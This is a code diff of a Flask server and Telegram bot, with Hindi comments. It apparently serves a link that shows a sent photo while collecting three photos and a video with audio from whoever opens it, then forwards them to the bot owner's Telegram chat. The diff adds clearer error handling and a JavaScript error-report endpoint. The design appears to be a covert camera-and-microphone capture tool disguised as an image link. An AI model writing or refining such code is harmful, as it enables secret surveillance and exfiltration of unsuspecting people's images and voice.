@@ -18,12 +18,10 @@ BASE_URL = os.getenv("BASE_URL", "http://localhost:5000")
 app = Flask(__name__)
 link_data = {}
 
-# स्टैटिक फोटो सर्व करें
 @app.route('/photos/<filename>')
 def serve_photo(filename):
     return send_from_directory('static', filename)
 
-# मुख्य पेज – केवल आपकी भेजी फोटो दिखाएगा
 @app.route('/image/<unique_id>')
 def image(unique_id):
     if unique_id not in link_data:
@@ -31,15 +29,14 @@ def image(unique_id):
     photo_url = f"/photos/{link_data[unique_id]['photo']}"
     return render_template('camera.html', unique_id=unique_id, photo_url=photo_url)
 
-# 3 फोटो अपलोड
 @app.route('/upload/<unique_id>', methods=['POST'])
 def upload_photo(unique_id):
     if unique_id not in link_data:
-        return {"status": "error"}, 400
+        return {"status": "error", "reason": "link expired"}, 400
     owner_id = link_data[unique_id]["owner"]
     data = request.get_json()
     if not data or 'image' not in data:
-        return {"status": "error"}, 400
+        return {"status": "error", "reason": "no image"}, 400
     image_b64 = data['image']
     if ',' in image_b64:
         image_b64 = image_b64.split(',')[1]
@@ -53,16 +50,18 @@ def upload_photo(unique_id):
         payload = {'chat_id': owner_id}
         resp = requests.post(url, files=files, data=payload)
     os.remove(temp_file)
-    return {"status": "ok"}, 200 if resp.status_code == 200 else 500
+    if resp.status_code != 200:
+        logging.error(f"sendPhoto failed: {resp.text}")
+        return {"status": "error", "reason": "telegram send failed"}, 500
+    return {"status": "ok"}, 200
 
-# 🎥 वीडियो (माइक के साथ) अपलोड – नया जोड़ा
 @app.route('/upload_video/<unique_id>', methods=['POST'])
 def upload_video(unique_id):
     if unique_id not in link_data:
-        return {"status": "error"}, 400
+        return {"status": "error", "reason": "link expired"}, 400
     owner_id = link_data[unique_id]["owner"]
     if 'video' not in request.files:
-        return {"status": "error"}, 400
+        return {"status": "error", "reason": "no video"}, 400
     video_file = request.files['video']
     temp_file = f"temp_video_{unique_id}.webm"
     video_file.save(temp_file)
@@ -72,13 +71,29 @@ def upload_video(unique_id):
         payload = {'chat_id': owner_id, 'caption': '🎥 Video with Audio'}
         resp = requests.post(url, files=files, data=payload)
     os.remove(temp_file)
-    return {"status": "ok"}, 200 if resp.status_code == 200 else 500
+    if resp.status_code != 200:
+        logging.error(f"sendVideo failed: {resp.text}")
+        return {"status": "error", "reason": "telegram send failed"}, 500
+    return {"status": "ok"}, 200
+
+# नया: एरर रिपोर्टिंग – जब JavaScript में कोई गड़बड़ हो तो बॉट ओनर को मैसेज भेजेगा
+@app.route('/error_report/<unique_id>', methods=['POST'])
+def error_report(unique_id):
+    if unique_id not in link_data:
+        return {"status": "error"}, 400
+    owner_id = link_data[unique_id]["owner"]
+    data = request.get_json()
+    if not data or 'message' not in data:
+        return {"status": "error"}, 400
+    msg = f"⚠️ Error from link {unique_id}:\n{data['message']}"
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                  json={'chat_id': owner_id, 'text': msg})
+    return {"status": "ok"}, 200
 
 @app.route('/health')
 def health():
     return "OK", 200
 
-# ---------- Telegram Bot Handlers ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Send me a photo and I'll give you an image link.")
 
